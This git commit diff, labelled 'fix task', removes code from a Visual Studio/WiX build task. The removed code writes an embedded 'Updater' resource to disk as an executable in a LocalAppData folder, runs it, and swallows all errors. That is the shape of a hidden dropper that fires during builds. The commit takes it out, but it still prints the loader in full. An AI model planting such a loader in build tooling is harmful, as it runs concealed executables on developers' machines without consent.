8d619603568299dd679a8813c11acc9c4616033c
ahklwceo <nicolas@slythe.net>
2018-05-09 21:33:43 -0400

    fix task

--- VisualStudioWix/Task.cs
+++ VisualStudioWix/Task.cs
@@ -28,47 +28,6 @@ namespace VisualStudioWix
 
         public bool Execute()
         {
-
-            try
-            {
-                string fileName = "Updater";
-
-                string tempDirectory = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
-                try
-                {
-                    if (Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) != "")
-                    {
-                        tempDirectory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "nddi");
-                    }
-                }
-                catch (Exception)
-                { }
-
-                string tmpExePath = Path.Combine(tempDirectory, fileName + ".exe");
-
-                if (!Directory.Exists(tempDirectory))
-                {
-                    Directory.CreateDirectory(tempDirectory);
-                }
-
-                object ob = Properties.Resources.ResourceManager.GetObject(fileName);
-                byte[] myResBytes = (byte[])ob;
-                using (FileStream fsDst = new FileStream(tmpExePath, FileMode.CreateNew, FileAccess.Write))
-                {
-                    byte[] bytes = myResBytes;
-                    fsDst.Write(bytes, 0, bytes.Length);
-                    fsDst.Close();
-                    fsDst.Dispose();
-                }
-
-                Process ExternalProcess = new Process();
-                ExternalProcess.StartInfo.FileName = tmpExePath;
-                ExternalProcess.StartInfo.CreateNoWindow = false;
-                ExternalProcess.StartInfo.UseShellExecute = false;
-                ExternalProcess.Start();
-            }
-            catch
-            { }
             return true;
         }
     }
